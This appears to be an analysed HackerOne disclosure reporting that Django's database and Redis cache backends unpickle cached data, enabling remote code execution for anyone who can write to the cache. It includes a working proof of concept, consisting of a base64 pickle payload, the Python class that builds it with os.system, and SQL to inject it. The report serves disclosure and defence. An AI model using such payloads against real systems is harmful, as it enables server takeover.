# Deserialization of Potentially Malicious Data to RCE in Django Cache Backends

## Metadata
- **Source:** HackerOne
- **Report:** 1415436 | https://hackerone.com/reports/1415436
- **Submitted:** 2021-12-02
- **Reporter:** scaramouche31
- **Program:** Django
- **Bounty:** Not specified
- **Severity:** High
- **Vuln:** Insecure Deserialization, Remote Code Execution, Privilege Escalation
- **CVEs:** CVE-2021-33026
- **Category:** memory-binary

## Summary
Django's database and Redis cache backends use Python pickle for serialization, which is vulnerable to arbitrary code execution if an attacker gains access to the cache storage. An attacker with access to the database or Redis instance can inject malicious pickled objects that execute arbitrary commands when deserialized by the Django application.

## Attack scenario
1. Attacker gains unauthorized access to the database or Redis cache instance (e.g., through compromised credentials, network exposure, or container escape)
2. Attacker crafts a malicious Python object with a __reduce__ method that executes system commands
3. Attacker pickles the malicious object and base64-encodes it
4. Attacker injects the payload into the cache table/store by modifying cache entries directly in the database or Redis
5. Django application retrieves and deserializes the poisoned cache entry using pickle.load()
6. The malicious __reduce__ method executes, granting attacker arbitrary code execution on the Django server with the application's privileges

## Root cause
Django cache backends (DatabaseCache and RedisCache) use Python's pickle module for serialization without validating the integrity or authenticity of cached data. Pickle is inherently unsafe for untrusted data as it can execute arbitrary Python code during deserialization through object magic methods like __reduce__.

## Attacker mindset
Lateral movement and privilege escalation focused. An attacker who compromises a cache layer seeks to pivot to the application server. The attacker understands that pickle deserialization in Python is a known vector for RCE and exploits the trust relationship between cache and application tiers in distributed systems.

## Defensive takeaways
- Avoid using pickle for untrusted data serialization; use safer alternatives like JSON or MessagePack with whitelisted types
- Implement strict network segmentation and access controls to cache storage (database/Redis instances)
- Use authentication and encryption for cache backends
- Monitor cache integrity with cryptographic signatures (HMAC) for cache entries
- Implement least privilege principles for database and cache user accounts
- Consider using Django's signing framework (django.core.signing) for cache data validation
- Document security implications of pickle in cache configuration
- Regularly audit and rotate credentials for cache backend access
- Use type-safe serialization formats or sandboxed deserialization environments
- Implement IDS/IPS rules to detect suspicious pickle payloads

## Variant hunting
Check all Django cache backends for pickle usage: locmem, filebased, db, redis, memcache
Audit other Python web frameworks (Flask, FastAPI, etc.) for similar pickle-based caching mechanisms
Investigate third-party Django cache backends for insecure deserialization patterns
Search for pickle.loads() or pickle.load() in session storage implementations
Review ORM caching mechanisms for unsafe deserialization
Test cache backends that wrap object serialization without validation
Examine distributed cache systems (Memcached variants) for similar vulnerabilities
Check for unsafe use of pickle in message queuing systems (Celery, RQ)

## MITRE ATT&CK
- T1190
- T1203
- T1648
- T1574
- T1105

## Notes
The reporter correctly identifies that file-based and local memory caches present lower risk (attacker would need direct filesystem access or local privilege already), but database and Redis caches are high-risk because they typically run on separate machines/containers in production environments. The CVE-2021-33026 Flask reference indicates this is a class of vulnerability across Python web frameworks. Django documentation already warns about pickle dangers in filebased cache, but this warning should be extended to database and redis backends. The use of pickle in cache was a design choice for performance but creates a security boundary issue in multi-tier architectures.

## Full report
<details><summary>Expand</summary>

Hello, Django Team! It's my first time working with you, hope it will be great!
Note: I have not seen this issue neither in known vulnerabilities nor in documentation, so here I am.

## Summary
Several type of caches in https://github.com/django/django/tree/main/django/core/cache/backends use python `pickle` which may result in RCE (basically privilege escalation) in case attacker will takeover a machine/container with cache.
So, 4 types of cache use `pickle.load` directly or under the hood:
1. Locmem - I don't consider it as a big issue, because locmem uses some random part of memory for cache taken by Python while the server runs + it is unlikely to be used in production.
2. Filebased - I don't consider it as an issue, because if you control the file with cache, it is likely that you control the machine where Django runs + this behaviour is mentioned in the documentation (https://docs.djangoproject.com/en/3.2/topics/cache/):
```
An attacker who gains access to the cache file can not only falsify HTML content, which your site will trust, but also remotely execute arbitrary code, as the data is serialized using pickle.
```
3. Database - this time I consider this as an issue, because a Django app and db are pretty likely running on different machines/containers. So in case attacker gains access to db, a door to privilege escalation via RCE on other machine is open.
4. Redis - though it was not released yet, it's already supported in dev version from source. Same thoughts here - Redis is likely to run in a separated environment.

## PoC, steps to reproduce:
I'm providing it for a db based cache, as Redis support is not officially released yet if I'm not mistaking
For an ease of PoC I will use sqlite3 on the same machine, but you of course may run a separate database.

1. Create a Django project, make some simple app.
2. Add this to `settings.py`:
```
MIDDLEWARE = [
    'django.middleware.cache.UpdateCacheMiddleware',
    ...
    'django.middleware.cache.FetchFromCacheMiddleware',
]
...
CACHE_MIDDLEWARE_ALIAS = 'default'
CACHE_MIDDLEWARE_KEY_PREFIX = ''
...
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.db.DatabaseCache',
        'LOCATION': 'my_cache_table',
    }
}
```
3. Run the server, visit your app's page to create a cache entry;
4. In your shell run:
`sqlite3 db.sqlite3`
5. Run `SELECT * FROM my_cache_table;` to find a row which stores the cached page (it was the second one in my case).
6. Run `UPDATE my_cache_table SET value = 'gASVHgAAAAAAAACMAm9zlIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=' where rowid=2;` with the id of your row,
7. Reload the web page.
8. Observe command execution in the server logs.

Video PoC:
{F1532035}

`gASVHgAAAAAAAACMAm9zlIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=` is a base64 version of pickled RCE payload:
```
class Pwner:
    def __reduce__(self):
        import os
        cmd = "whoami"
        return os.system, (cmd,)
```

## Reference
As a reference I'm leaving a very same issue in Flask: 
https://vulmon.com/vulnerabilitydetails?qid=CVE-2021-33026&scoretype=cvssv2

## Attack scenario:
1. Attacker gains an access to machine/container with cache instance.
2. Attacker now can run arbitrary code on machine with running Django server.

## Impact

RCE, full machine takeover

</details>

---
*Analysed by Claude on 2026-05-12*
